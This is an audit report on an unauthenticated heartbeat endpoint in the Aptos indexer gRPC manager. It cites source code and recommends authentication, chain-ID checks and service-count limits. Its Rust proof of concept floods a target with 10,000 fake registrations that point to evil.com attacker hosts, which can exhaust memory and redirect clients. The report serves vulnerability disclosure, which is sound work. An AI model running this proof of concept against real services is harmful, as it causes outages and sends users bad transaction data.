# Audit Report

## Title
Unauthenticated Heartbeat Endpoint Enables Unbounded Service Registration and Memory Exhaustion in Indexer gRPC Manager

## Summary
The `GrpcManagerService` exposes an unauthenticated `heartbeat()` endpoint that allows external attackers to register unlimited malicious data services, leading to memory exhaustion and service redirection attacks. The lack of isolation between the public gRPC service and internal state managers (`MetadataManager` and `DataManager`) enables service-level attacks without authentication, chain ID validation, or rate limiting.

## Finding Description

The `GrpcManagerService` created at line 92 shares `Arc` references to `metadata_manager` and `data_manager` with no isolation boundary: [1](#0-0) 

This service exposes a public `heartbeat()` endpoint without authentication: [2](#0-1) 

The endpoint accepts arbitrary `ServiceInfo` with only basic field presence checks, then directly passes to `metadata_manager.handle_heartbeat()`: [3](#0-2) 

The `MetadataManager` handles heartbeats without validating chain ID: [4](#0-3) 

For `LiveDataServiceInfo` and `HistoricalDataServiceInfo`, new services are inserted unconditionally with `.or_insert()`: [5](#0-4) [6](#0-5) 

While there's a limit on states per service (100), there's **no limit** on the number of unique service addresses that can be registered.

**Attack Path:**
1. Attacker sends `HeartbeatRequest` messages with arbitrary addresses and `LiveDataServiceInfo` or `HistoricalDataServiceInfo`
2. Each unique address creates a new entry in `DashMap<GrpcAddress, LiveDataService>` or `DashMap<GrpcAddress, HistoricalDataService>`
3. No authentication, chain ID validation, or service count limits prevent unlimited registration
4. Memory exhaustion occurs as DashMaps grow unbounded
5. Malicious services are selected by `get_data_service_for_request()`, redirecting clients to attacker-controlled endpoints [7](#0-6) 

Additionally, the master address can be overwritten by any heartbeat: [8](#0-7) 

## Impact Explanation

**High Severity** per Aptos bug bounty criteria:

1. **API Crashes**: Unbounded memory growth leads to out-of-memory crashes of the indexer gRPC manager service
2. **Service Degradation**: Legitimate clients are redirected to malicious data services serving incorrect transaction data
3. **Significant Protocol Violations**: The indexer infrastructure's integrity is compromised, affecting the entire indexer ecosystem

While this doesn't directly affect blockchain consensus or state commitment, it impacts critical infrastructure that applications depend on for transaction data access.

## Likelihood Explanation

**High Likelihood**:
- Attack requires no authentication or privileged access
- Endpoint is publicly exposed on the network
- Exploitation is trivial (send gRPC requests with arbitrary addresses)
- No rate limiting or service count caps prevent the attack
- Attacker can automate registration of thousands of malicious services

## Recommendation

Implement comprehensive security controls:

1. **Authentication**: Add API key or mutual TLS authentication for heartbeat endpoint
2. **Chain ID Validation**: Reject heartbeats where `info.chain_id != self.chain_id`
3. **Service Count Limits**: Enforce maximum number of registered data services
4. **Address Allowlisting**: Only accept heartbeats from pre-configured trusted addresses
5. **Rate Limiting**: Implement rate limits on heartbeat requests per source IP
6. **Master Address Protection**: Only update master address from authenticated, trusted peers

Example fix for chain ID validation:

```rust
fn handle_live_data_service_info(
    &self,
    address: GrpcAddress,
    info: LiveDataServiceInfo,
) -> Result<()> {
    // Validate chain ID
    if info.chain_id != self.chain_id {
        bail!("Invalid chain_id: expected {}, got {}", self.chain_id, info.chain_id);
    }
    
    // Enforce service count limit
    const MAX_DATA_SERVICES: usize = 1000;
    if self.live_data_services.len() >= MAX_DATA_SERVICES {
        bail!("Maximum number of data services reached");
    }
    
    // Rest of implementation...
}
```

## Proof of Concept

```rust
#[tokio::test]
async fn test_unbounded_service_registration() {
    use aptos_protos::indexer::v1::{
        grpc_manager_client::GrpcManagerClient,
        HeartbeatRequest, ServiceInfo, LiveDataServiceInfo,
        service_info::Info,
    };
    use tonic::transport::Channel;
    
    // Connect to target gRPC manager
    let channel = Channel::from_static("http://target-grpc-manager:50051")
        .connect()
        .await
        .unwrap();
    let mut client = GrpcManagerClient::new(channel);
    
    // Register 10,000 malicious data services
    for i in 0..10000 {
        let malicious_address = format!("http://attacker-service-{}.evil.com:50051", i);
        
        let heartbeat = HeartbeatRequest {
            service_info: Some(ServiceInfo {
                address: Some(malicious_address),
                info: Some(Info::LiveDataServiceInfo(LiveDataServiceInfo {
                    chain_id: 999, // Wrong chain ID, still accepted
                    timestamp: Some(timestamp_now_proto()),
                    known_latest_version: Some(1000000),
                    stream_info: Some(StreamInfo { active_streams: vec![] }),
                    min_servable_version: Some(0),
                })),
            }),
        };
        
        // This succeeds, registering unlimited services
        client.heartbeat(heartbeat).await.unwrap();
    }
    
    // Memory exhaustion and DoS achieved
    // Legitimate clients now redirected to attacker services
}
```

## Notes

This vulnerability is specific to the indexer-grpc infrastructure and does not directly affect blockchain consensus, Move VM execution, or core state management. However, it represents a critical failure in the indexer service tier that applications depend on for transaction data access. The lack of authentication and validation at the gRPC service boundary allows external attacks to propagate directly into internal state management, violating the principle of defense in depth.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L92-96)
```rust
        let service = GrpcManagerServer::new(GrpcManagerService::new(
            self.chain_id,
            self.metadata_manager.clone(),
            self.data_manager.clone(),
        ))
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L148-196)
```rust
    async fn get_data_service_for_request(
        &self,
        request: Request<GetDataServiceForRequestRequest>,
    ) -> Result<Response<GetDataServiceForRequestResponse>, Status> {
        let request = request.into_inner();

        if request.user_request.is_none()
            || request
                .user_request
                .as_ref()
                .unwrap()
                .starting_version
                .is_none()
        {
            let candidates = self.metadata_manager.get_live_data_services_info();
            if let Some(candidate) = candidates.iter().next() {
                let data_service_address = candidate.0.clone();
                return Ok(Response::new(GetDataServiceForRequestResponse {
                    data_service_address,
                }));
            } else {
                return Err(Status::internal(
                    "Cannot find a data service instance to serve the provided request.",
                ));
            }
        }

        let starting_version = request.user_request.unwrap().starting_version();

        let data_service_address =
            // TODO(grao): Use a simple strategy for now. Consider to make it smarter in the
            // future.
            if let Some(address) = self.pick_live_data_service(starting_version) {
                COUNTER.with_label_values(&["live_data_service_picked"]).inc();
                address
            } else if let Some(address) = self.pick_historical_data_service(starting_version).await {
                COUNTER.with_label_values(&["historical_data_service_picked"]).inc();
                address
            } else {
                COUNTER.with_label_values(&["failed_to_pick_data_service"]).inc();
                return Err(Status::internal(
                    "Cannot find a data service instance to serve the provided request.",
                ));
            };

        Ok(Response::new(GetDataServiceForRequestResponse {
            data_service_address,
        }))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L330-339)
```rust
    pub(crate) fn handle_heartbeat(&self, address: GrpcAddress, info: Info) -> Result<()> {
        match info {
            Info::LiveDataServiceInfo(info) => self.handle_live_data_service_info(address, info),
            Info::HistoricalDataServiceInfo(info) => {
                self.handle_historical_data_service_info(address, info)
            },
            Info::FullnodeInfo(info) => self.handle_fullnode_info(address, info),
            Info::GrpcManagerInfo(info) => self.handle_grpc_manager_info(address, info),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L494-497)
```rust
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L516-519)
```rust
        let mut entry = self
            .historical_data_services
            .entry(address.clone())
            .or_insert(HistoricalDataService::new(address));
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L552-556)
```rust
    fn handle_grpc_manager_info(&self, address: GrpcAddress, info: GrpcManagerInfo) -> Result<()> {
        self.master_address
            .lock()
            .unwrap()
            .clone_from(&info.master_address);
```
